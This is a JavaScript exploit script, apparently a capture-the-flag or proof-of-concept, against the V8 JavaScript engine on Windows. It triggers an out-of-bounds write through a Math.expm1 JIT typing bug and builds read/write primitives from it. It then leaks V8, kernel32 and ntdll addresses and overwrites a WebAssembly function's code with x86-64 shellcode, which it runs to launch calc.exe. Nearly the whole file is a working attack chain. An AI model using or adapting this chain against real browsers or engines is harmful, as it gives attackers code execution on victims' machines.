Math.sin(10);
String.prototype.padLeft =
Number.prototype.padLeft = function(total, pad) {
  return (Array(total).join(pad || 0) + this).slice(-total);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++){
        //console.log(bytes[i].toString(16));
        res.push(('0' + bytes[i].toString(16)).substr(-2));
    }
    return res.join('');

}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function little_unhexlify(hexstr) {
  if (hexstr.length % 2 == 1)
      throw new TypeError("Invalid hex string");

  var bytes = new Uint8Array(hexstr.length / 2);
  for (var i = 0; i < hexstr.length; i += 2){
    bytes[hexstr.length/2 - i/2 - 1] = parseInt(hexstr.substr(i, 2), 16);
  }
  return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
        var chunk = data.slice(i, i+16);
    for (var i = 0; i < data.length; i += 16) {
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;
            if (v.length == 12){
              v = '00' + v
            }

            var bigEndian = unhexlify(v, 8);
            //console.log(bigEndian.toString());
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        //console.log("toString");
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function hex(a) {
    if (a == undefined) return "0xUNDEFINED";
    var ret = a.toString(16);
    if (ret.substr(0,2) != "0x") return "0x"+ret;
    else return ret;
}

function lower(x) {
    // returns the lower 32bit of double x
    return parseInt(("0000000000000000" + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;
}

function upper(x) {
    // returns the upper 32bit of double x
    return parseInt(("0000000000000000" + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;
}


function lowerint(x) {
    // returns the lower 32bit of int x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-8,8),16) | 0;
}

function upperint(x) {
    // returns the upper 32bit of int x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-16, 8),16) | 0;
}

function combine(a, b) {
    //a = a >>> 0;
    //b = b >>> 0;
    //console.log(a.toString());
    //console.log(b.toString());
    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);
}


//padLeft用于字符串左补位

function combineint(a, b) {
    //a = a >>> 0;
    //b = b >>> 0;
    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);
}

function gc(){
  for (var i = 0; i < 1024 * 1024 * 16; i++){
    new String();
  }
}

function clear_space(){
  gc();
  gc();
}

function get_shell(){
    return 1 + 1;
}

leak = new ArrayBuffer(109);
function foo() {
  let y = {a:-0};
  var re = Object.is(Math.expm1.call(Math.expm1, -0), y.a);
  var num = re | 0;
  a1 = new Array(0x10);
  a1[0] = 1.1;
  oob_double_Array = new Array(0x10);
  oob_double_Array[0] = 1.1;
  object_Array = new Array(0x10);
  object_Array[1] = leak;
  a1[num * 41] = 2.60750842793813e-310;
  a1[num * 21] = 2.60750842793813e-310;
  // a1[num * 41] = 2.60750842793813e-310;
}
var a1, oob_double_Array, object_Array, oob_buffer;

var ab = new ArrayBuffer(0x100);
var _ab_proto_ = ab.__proto__;


function user_space_object_addr_of(object){
  object_Array[0] = object;
  return oob_double_Array[22];
}

function readPtr(addr){
  oob_double_Array[62] = addr;
  fake_dv = new Float64Array(rw_primitive_ab);
  return fake_dv[0];
}

function writePtr(addr, value){
  oob_double_Array[62] = addr;
  fake_dv = new Float64Array(rw_primitive_ab);
  fake_dv[0] = value;
}

function writeByte(addr, value){
    oob_double_Array[62] = addr;
    fake_dv = new Uint8Array(rw_primitive_ab);
    fake_dv[0] = value;
  }

var rw_primitive_ab = null;

function pwn(){
  foo();
  foo();
  %OptimizeFunctionOnNextCall(foo);
  foo();
  if(oob_double_Array.length != 12288){
    console.log("Out Of Bounds Write Fail");
    return;
  }
  console.log("Out Of Bounds Write Successfully and the oob_double_Array.length is " + oob_double_Array.length);
  
  rw_primitive_ab = new ArrayBuffer(0x1000);
  
  ab_proto_addr = user_space_object_addr_of(_ab_proto_);  
  console.log("[+] ab_proto_addr is @ " + Int64.fromDouble(ab_proto_addr));
  rw_primitive_ab_addr = user_space_object_addr_of(rw_primitive_ab);
  console.log("[+] rw_primitive_ab_addr is @ " + Int64.fromDouble(rw_primitive_ab_addr));


  readPtr(ab_proto_addr);// rw_primitive_ab arraybuffer backing store has been modified to _ab_proto_addr;
  array_proto_push_addr = user_space_object_addr_of(Array.prototype.push);
  console.log("[+] array_proto_push_addr is @ " + Int64.fromDouble(array_proto_push_addr));

  push_code_addr = readPtr(array_proto_push_addr + new Int64(0x2f).asDouble());
  console.log("[+] array_proto_push_code_addr is @ " + Int64.fromDouble(push_code_addr));

  v8_base = ('0000' + Int64.fromDouble(readPtr(push_code_addr + new Int64(0x3f).asDouble())).toString().substr(2, 12));
  re = little_unhexlify(v8_base);
  dv = new Float64Array(re.buffer);
  v8_base = dv[0] - new Int64(0x18d7740).asDouble();
  console.log("[+] v8 libbase is @ " + Int64.fromDouble(v8_base));
  
  v8_libbase = readPtr(v8_base + new Int64(0x2083300).asDouble()) - new Int64(0x2f7d0).asDouble();
  console.log("[+] v8_libbase addr is @ " + Int64.fromDouble(v8_libbase));

  kernel32_addr = readPtr(v8_libbase + new Int64(0x46ac0).asDouble()) - new Int64(0x13c90).asDouble();
  console.log("[+] kernel32 addr is @ " + Int64.fromDouble(kernel32_addr));

  ntdll_addr = readPtr(kernel32_addr + new Int64(0x79208).asDouble())  - new Int64(0x9b450).asDouble();
  console.log("[+] ntdll addr is @ " + Int64.fromDouble(ntdll_addr));

  gadget = ntdll_addr + new Int64(0xa11b5).asDouble();
  console.log("[+] gadget addr is @ " + Int64.fromDouble(gadget));

  virtualprotect_addr = kernel32_addr + new Int64(0x193d0).asDouble();
  console.log("[+] virtualprotect addr is @ " + Int64.fromDouble(virtualprotect_addr));

  pop_rcx_ret = v8_base + new Int64(0x2252c84).asDouble();
  console.log("[+] pop rcx addr is @ " + Int64.fromDouble(pop_rcx_ret));

  pop_rdx_ret = ntdll_addr + new Int64(0x12b0b8).asDouble();
  console.log("[+] pop rdx addr is @ " + Int64.fromDouble(pop_rdx_ret));

  pop_r8_rax_ret = v8_base + new Int64(0xee0720).asDouble();
  console.log("[+] pop r8 rax addr is @ " + Int64.fromDouble(pop_r8_rax_ret));

  pop_r9_r10_r11_ret = ntdll_addr + new Int64(0x8b3c4).asDouble();
  console.log("[+] pop r9 r10 r11 addr is @ " + Int64.fromDouble(pop_r9_r10_r11_ret));
  // %DebugPrint(Array.prototype.push); 

  var wasm_module="0061736d01000000010b0260017f017f60027f7f00020b01036d6f6403696d7000000303020001050301000107210308726561645f75333200010977726974655f7533320002066d656d6f727902000a1302070020002802000b0900200020013602000b"

  function parse_wasm_module() {
    var len = wasm_module.length / 2;
    var buf = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
      hex = '0x' + wasm_module.substring(i * 2, i * 2 + 2);
      buf[i] = parseInt(hex);
    }
    return buf;
  }

  var module_wasm = [0, 97, 115, 109, 1, 0, 0, 0, 1, 43, 4, 96, 0, 1, 127, 96, 5, 124, 124, 124, 124, 124, 1, 127, 96, 19, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 1, 127, 96, 2, 124, 124, 1, 124, 2, 11, 1, 2, 106, 115, 3, 109, 101, 109, 2, 0, 1, 3, 5, 4, 0, 1, 2, 3, 7, 15, 2, 4, 97, 100, 100, 49, 0, 1, 4, 97, 100, 100, 50, 0, 3, 10, 169, 1, 4, 4, 0, 65, 42, 11, 4, 0, 16, 0, 11, 148, 1, 0, 65, 0, 32, 0, 55, 3, 0, 65, 8, 32, 1, 55, 3, 0, 65, 16, 32, 2, 55, 3, 0, 65, 24, 32, 3, 55, 3, 0, 65, 32, 32, 4, 55, 3, 0, 65, 40, 32, 5, 55, 3, 0, 65, 48, 32, 6, 55, 3, 0, 65, 56, 32, 7, 55, 3, 0, 65, 192, 0, 32, 8, 55, 3, 0, 65, 200, 0, 32, 9, 55, 3, 0, 65, 208, 0, 32, 10, 55, 3, 0, 65, 216, 0, 32, 11, 55, 3, 0, 65, 224, 0, 32, 12, 55, 3, 0, 65, 232, 0, 32, 13, 55, 3, 0, 65, 240, 0, 32, 14, 55, 3, 0, 65, 248, 0, 32, 15, 55, 3, 0, 65, 128, 1, 32, 16, 55, 3, 0, 65, 136, 1, 32, 17, 55, 3, 0, 65, 144, 1, 32, 18, 55, 3, 0, 65, 0, 11, 7, 0, 32, 0, 32, 1, 160, 11];
  function getSharedTypedArray(){
    var wasmarr = module_wasm;
    var sb = new ArrayBuffer(wasmarr.length);           //------------------> 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i<sta.length;i++)
        sta[i]=wasmarr[i];
    return sta;
  }

  var raw_wasm = getSharedTypedArray();
  var wasm_mod = new WebAssembly.Module(raw_wasm);
  var memory = new WebAssembly.Memory({initial:10, maximum:100});
  var wasm = new WebAssembly.Instance(wasm_mod, { js: { mem: memory } });

  let f = wasm.exports.add1;

  wasm_function = user_space_object_addr_of(f);
  console.log("[+] wasm_function addr is @ " + Int64.fromDouble(wasm_function));

  code_addr = readPtr(wasm_function + new Int64(0x47).asDouble());
  console.log("[+] code addr is @ " + Int64.fromDouble(code_addr));

  real_code_addr = readPtr(code_addr + new Int64(0xef).asDouble());
  console.log("[+] real code addr is @ " + Int64.fromDouble(real_code_addr));

 var shellcode1 = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,72, 131, 236, 40, 72, 131, 228, 240, 72, 199, 194, 96, 0, 0, 0, 101, 76, 139, 34, 77, 139, 100, 36, 24, 77, 139, 100, 36, 32, 77, 139, 36, 36, 77, 139, 36, 36, 77, 139, 100, 36, 32, 72, 186, 142, 78, 14, 236, 0, 0, 0, 0, 73, 139, 204, 232, 102, 0, 0, 0, 235, 56, 89, 255, 208, 72, 199, 194, 152, 254, 138, 14, 73, 139, 204, 232, 82, 0, 0, 0, 72, 139, 216, 77, 51, 201, 235, 60, 65, 88, 235, 42, 90, 72, 139, 202, 255, 211, 72, 199, 194, 197, 181, 73, 17, 73, 139, 204, 232, 49, 0, 0, 0, 72, 51, 201, 255, 208, 232, 195, 255, 255, 255, 117, 115, 101, 114, 51, 50, 46, 100, 108, 108, 0, 232, 209, 255, 255, 255, 99, 97, 108, 99, 46, 101, 120, 101, 0, 232, 191, 255, 255, 255, 99, 97, 108, 99, 46, 101, 120, 101, 0, 76, 139, 233, 65, 139, 69, 60, 77, 139, 221, 76, 3, 232, 69, 139, 181, 136, 0, 0, 0, 77, 3, 243, 69, 139, 86, 24, 65, 139, 94, 32, 73, 3, 219, 103, 227, 60, 73, 255, 202, 66, 139, 52, 147, 73, 3, 243, 72, 51, 255, 72, 51, 192, 252, 172, 132, 192, 116, 7, 193, 207, 13, 3, 248, 235, 244, 59, 250, 117, 220, 65, 139, 94, 36, 73, 3, 219, 51, 201, 102, 66, 139, 12, 83, 65, 139, 94, 28, 73, 3, 219, 139, 4, 139, 73, 3, 195, 195]
  for(var i = 0; i < shellcode1.length; i++){
      writeByte(real_code_addr + new Int64(i).asDouble(), shellcode1[i]);
  }

  Math.sin(10);
  f();
}

pwn();
